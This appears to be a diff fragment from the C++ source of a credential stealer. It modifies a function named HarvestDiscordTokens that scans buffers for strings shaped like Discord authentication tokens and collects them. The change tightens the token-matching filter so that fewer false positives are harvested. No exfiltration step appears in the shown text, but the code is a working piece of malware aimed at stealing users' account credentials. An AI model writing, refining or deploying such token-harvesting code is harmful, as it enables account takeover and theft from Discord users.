@@ -1149,7 +1149,10 @@ static void HarvestDiscordTokens() {
                         while (end < sz && IsTokenChar(buf[end]) && end - i < 130) end++;
                         DWORD seg3 = end - dp[1] - 1;
                         if (seg1 >= 15 && seg1 <= 35 && seg2 >= 4 && seg2 <= 12 && seg3 >= 20 && seg3 <= 60) {
-                            totalCandidates++; tokens.push_back(std::string(buf + i, end - i));
+                            bool v = true;
+                            for (int k = i; k < dp[0]; k++) if (buf[k] == '-' || buf[k] == '_') { v = false; break; }
+                            for (int k = dp[0]+1; k < dp[1]; k++) if (buf[k] == '-' || buf[k] == '_') { v = false; break; }
+                            if (v) { totalCandidates++; tokens.push_back(std::string(buf + i, end - i)); }
                         }
                     }
                     // Skip past this run of token chars
@@ -1218,8 +1221,12 @@ static void HarvestDiscordTokens() {
                                         DWORD seg1 = dp[0] - i, seg2 = dp[1] - dp[0] - 1;
                                         while (end < rd && IsTokenChar(buf[end]) && end - i < 130) end++;
                                         DWORD seg3 = end - dp[1] - 1;
-                                        if (seg1 >= 15 && seg1 <= 35 && seg2 >= 4 && seg2 <= 12 && seg3 >= 20 && seg3 <= 60)
-                                            tokens.push_back(std::string(buf + i, end - i));
+                                        if (seg1 >= 15 && seg1 <= 35 && seg2 >= 4 && seg2 <= 12 && seg3 >= 20 && seg3 <= 60) {
+                                            bool v = true;
+                                            for (int k = i; k < dp[0]; k++) if (buf[k] == '-' || buf[k] == '_') { v = false; break; }
+                                            for (int k = dp[0]+1; k < dp[1]; k++) if (buf[k] == '-' || buf[k] == '_') { v = false; break; }
+                                            if (v) tokens.push_back(std::string(buf + i, end - i));
+                                        }
                                     }
                                     while (i < rd && IsTokenChar(buf[i])) i++;
                                 }
